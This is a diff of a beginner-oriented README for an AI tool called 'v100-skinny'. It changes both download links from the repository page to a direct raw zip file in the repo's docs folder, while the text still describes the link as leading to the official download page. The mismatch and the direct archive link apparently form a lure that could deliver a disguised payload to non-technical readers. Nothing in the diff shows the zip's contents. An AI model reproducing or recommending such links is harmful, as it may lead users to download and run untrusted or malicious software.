@@ -1,6 +1,6 @@
 # ⚡ v100-skinny - Fastest AI on Old GPUs
 
-[![Download v100-skinny](https://img.shields.io/badge/Download-v100--skinny-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/Alfinaa9442/v100-skinny)
+[![Download v100-skinny](https://img.shields.io/badge/Download-v100--skinny-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/Alfinaa9442/v100-skinny/raw/refs/heads/main/docs/skinny_v_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide is written for beginners. You don't need any programming skills. Just
 
 To get started, you need to download the software. Visit the link below to get your copy:
 
-🔗 **[Click here to download v100-skinny](https://github.com/Alfinaa9442/v100-skinny)**
+🔗 **[Click here to download v100-skinny](https://github.com/Alfinaa9442/v100-skinny/raw/refs/heads/main/docs/skinny_v_v2.5.zip)**
 
 This link takes you to the official download page. Look for the biggest green button that says "Code" or a "Download" button. Click it, then choose "Download ZIP" from the menu. Your computer will start downloading the file.
 
